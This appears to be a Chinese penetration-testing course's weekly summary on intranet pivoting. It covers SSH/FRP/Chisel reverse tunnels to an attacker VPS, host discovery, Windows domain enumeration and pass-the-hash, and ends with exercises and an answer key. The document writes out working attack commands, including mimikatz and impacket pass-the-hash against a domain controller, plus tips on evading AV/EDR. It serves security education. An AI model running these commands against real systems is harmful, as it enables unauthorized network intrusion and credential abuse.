---
title: Week 11：内网渗透与隧道代理 - 周度总结
tags:
  - 学习总结
  - 阶段复盘
categories:
  - 网络安全
date: 2026-04-07
---

# Week 11：内网渗透与隧道代理 (Intranet & Tunneling) - 周度总结

## 📅 本周学习概览

进入第三阶段，我们的视角从“单机”拓展到了“域”。外网打点只是开始，内网才是数据的金矿。

本周的核心挑战是：**如何在网络隔离的环境中自由行动？** 我们学习了各种隧道技术，把攻击者的流量“偷运”进内网，把内网的流量“转发”出来。我们不再畏惧防火墙和 NAT，因为我们掌握了端口转发和代理技术。同时，我们初步接触了 Windows 域（Domain）的概念，这是企业内网的核心管理架构。

<!--more-->

---

## 📚 每日核心知识回顾

### Day 061：内网网络架构与代理原理
- **DMZ 区**：对外提供服务（Web, Mail），最易被攻陷。
- **办公区/核心区**：存放核心数据，通常禁止直连外网。
- **正向代理 (Forward Proxy)**：客户端找代理（我要访问 Google） -> 代理去访问 -> 返回。**场景：攻击者通过 WebShell 主动连接内网主机（需目标有公网 IP 或防火墙开放入站，少见）。**
- **反向代理 (Reverse Proxy)**：内网主机主动找代理（我要把数据给你） -> 代理转发。**场景：WebShell 主动连攻击者 VPS，建立隧道。**

### Day 062：SSH 隧道与端口转发实战
- **SSH 本地转发 (Local)**：`ssh -L <local_port>:<target_ip>:<target_port> user@ssh_server`
  - **应用**：我连上了跳板机，想访问跳板机内网的 3389。
- **SSH 远程转发 (Remote)**：`ssh -R <remote_port>:<target_ip>:<target_port> user@vps_ip`
  - **应用**：内网跳板机（无公网 IP）主动连我的 VPS，把内网 80 暴露给 VPS。
- **动态转发 (Dynamic)**：`ssh -D <local_port> user@ssh_server`
  - **应用**：建立一个 SOCKS 代理，浏览器通过该代理访问内网所有服务。

### Day 063：FRP/Chisel 高级隧道搭建
- **FRP (Fast Reverse Proxy)**：功能最强，支持 TCP/UDP/HTTP/SOCKS。
  - 服务端 (`frps.ini`) 部署在 VPS。
  - 客户端 (`frpc.ini`) 部署在内网 WebShell。
- **Chisel**：基于 Go 的 HTTP 隧道，单一文件，过防火墙能力强。
  - `chisel server -p 8000 --reverse` (VPS)
  - `chisel client <vps_ip>:8000 R:socks` (内网)

### Day 064：内网主机发现与端口扫描
- **存活探测**：
  - ICMP: `ping -c 1 192.168.1.1` (Linux), `for /L %i in (1,1,254) do @ping -w 1 -n 1 192.168.1.%i` (Windows)。
  - NetBIOS: `nbtscan 192.168.1.0/24`（快速识别 Windows 主机名）。
- **端口扫描**：
  - 代理下扫描：`proxychains nmap -sT -Pn 192.168.1.10`（必须用 TCP Connect 扫描 `-sT`，因为 SOCKS 不支持 SYN 半开扫描）。
  - 静态编译工具：上传编译好的 nmap 或 scanline 到跳板机执行。

### Day 065：Windows 域环境基础概念
- **Domain Controller (DC)**：域控，内网的皇权中心，存储所有用户 Hash。
- **Active Directory (AD)**：活动目录，数据库。
- **OU (Organizational Unit)**：组织单位，用于归类用户和计算机。
- **常用命令**：
  - `net time /domain`：查看时间服务器（通常就是 DC）。
  - `net user /domain`：列出域用户。
  - `net group "domain admins" /domain`：列出域管理员。

### Day 066：横向移动入门 (IPC$ & PtH)
- **IPC$ (Inter-Process Communication)**：空会话。`net use \\192.168.1.10\ipc$ "" /user:""`。
- **哈希传递 (Pass the Hash, PtH)**：
  - **原理**：Windows NTLM 认证协议不需要明文密码，只需要 NTLM Hash 即可完成认证。
  - **场景**：你抓到了管理员的 Hash，但解不开明文。
  - **工具**：`mimikatz "sekurlsa::pth /user:admin /domain:hack.com /ntlm:HASH /run:cmd.exe"`。

### Day 067：周末闯关 - 搭建多级代理穿透内网
- **实战场景**：
  1.  攻击机 -> 跳板机 A (Linux, 有公网)。
  2.  跳板机 A -> 跳板机 B (Windows, 只有内网)。
  3.  目标：攻击机直接访问跳板机 B 的 3389 远程桌面。
- **方案**：
  - A 上运行 FRP Server。
  - B 上运行 FRP Client 连接 A，暴露 3389。
  - 或者使用 `ssh -J` (Jump Host) 技术。

---

## 📝 巩固练习题 (Level 11)

### 一、 概念速查（单选/简答）

1.  **在使用 ProxyChains 配合 Nmap 扫描时，为什么不能使用 `-sS` (SYN Scan) 参数？**
    A) 速度太慢
    B) SOCKS 协议不支持发送原始数据包（Raw Socket）
    C) 容易被防火墙发现
    D) Nmap 版本问题
2.  **在 SSH 端口转发中，`-L` 和 `-R` 的核心区别是什么？**
3.  **内网渗透中，`net time /domain` 这个命令的主要用途是什么？**
4.  **什么是 SMB 协议？它在横向移动中扮演什么角色？**
5.  **如果要在一个完全不出网（不能访问互联网）的内网主机上搭建隧道，你会选用哪种类型的隧道工具？（如：Pystinger, Neo-reGeorg, ICMP 隧道）**

### 二、 场景分析与安全实践（实战模拟）

6.  **场景：内网探测**
    你通过 WebShell 拿到了一台内网 Windows 主机。你想知道当前局域网段（192.168.50.0/24）还有哪些主机存活。
    *   在没有 Nmap 的情况下，你能用什么 Windows 原生命令快速发现存活主机？（写出命令）
    *   如果你发现了一台主机名为 `FILE-SERVER`，你想知道它开放了哪些共享文件，用什么命令？

7.  **场景：PtH 攻击**
    你获取了域管理员的 NTLM Hash：`aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0`。
    *   你想用 `impacket-psexec` 远程连接域控 (DC IP: 10.0.0.1)。请写出命令格式。
    *   为什么 PtH 不需要解密出明文密码 `123456`？

8.  **场景：隧道选择**
    目标网络环境如下：Web 服务器只开放 80 端口，且防火墙只允许 HTTP 流量进出，封锁了 TCP 非 80 端口和 UDP。
    *   SSH 隧道还能用吗？
    *   FRP 应该配置成什么模式？
    *   Neo-reGeorg 这类 HTTP 隧道工具适不适合？为什么？

### 三、 深度思考与综合分析

9.  **为什么现在企业内网普遍都在部署“零信任 (Zero Trust)”架构？传统的“边界防御（防火墙+VPN）”模型有什么致命缺陷？**

10. **在横向移动时，使用 Windows 原生命令（如 `net use`, `wmic`, `sc`）和使用第三方工具（如 `psexec.exe`, `frp`）相比，哪种方式更安全（OpSec）？为什么？**

---

## 🔑 参考答案

### 一、 概念速查
1.  **B) SOCKS 协议不支持发送原始数据包**。SOCKS 只能代理完整的 TCP 连接。
2.  **连接发起方向不同**。`-L` 是本地监听端口，转发到远程；`-R` 是远程监听端口，转发回本地。
3.  **定位域控制器 (DC)**。因为域内所有主机必须与 DC 时间同步，时间服务器通常就是 DC。
4.  **Server Message Block**，文件共享协议。横向移动常利用 SMB 协议传输文件、执行命令 (PsExec) 或读取配置。
5.  **HTTP 隧道 (Neo-reGeorg/Pystinger)** 或 **ICMP 隧道**。因为它们可以复用 Web 服务端口或利用允许的 ICMP 协议。

### 二、 场景分析
6.  **内网探测**。
    *   `for /L %i in (1,1,254) do @ping -w 1 -n 1 192.168.50.%i | find "TTL="` (ARP 扫描也可以 `arp -a`)。
    *   `net view \\FILE-SERVER` 或 `net view /all`。
7.  **PtH 攻击**。
    *   `python3 psexec.py domain/administrator@10.0.0.1 -hashes aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0`。
    *   因为 NTLM 认证协议中，Challenge/Response 的计算过程使用的是 Hash，而不是明文。
8.  **隧道选择**。
    *   不能直接用（默认 22 端口被封）。除非 SSH 运行在 80 端口（不太可能，会冲突）。
    *   FRP 需配置为 **HTTP/HTTPS 模式** 或使用 WebSocket 封装。
    *   **非常适合**。Neo-reGeorg 本质是上传一个 WebShell 脚本（.php/.jsp），将 TCP 流量封装在 HTTP POST 请求中转发，完美通过只允许 HTTP 的防火墙。

### 三、 深度思考
9.  **零信任 vs 边界防御**。
    *   缺陷：**“内网即信任”**。一旦攻击者突破边界（如钓鱼邮件、VPN 漏洞），进入内网后基本畅通无阻。
    *   零信任：**“永不信任，始终验证”**。无论你在内网还是外网，访问任何资源都需要经过身份认证和权限校验。
10. **原生命令更安全**。
    *   **Live off the Land (LotL)** 策略。
    *   第三方工具（特别是黑客工具）容易被杀毒软件（AV/EDR）静态查杀或行为拦截。
    *   原生命令是系统自带的，混杂在正常管理员操作中，难以区分且不会被查杀。
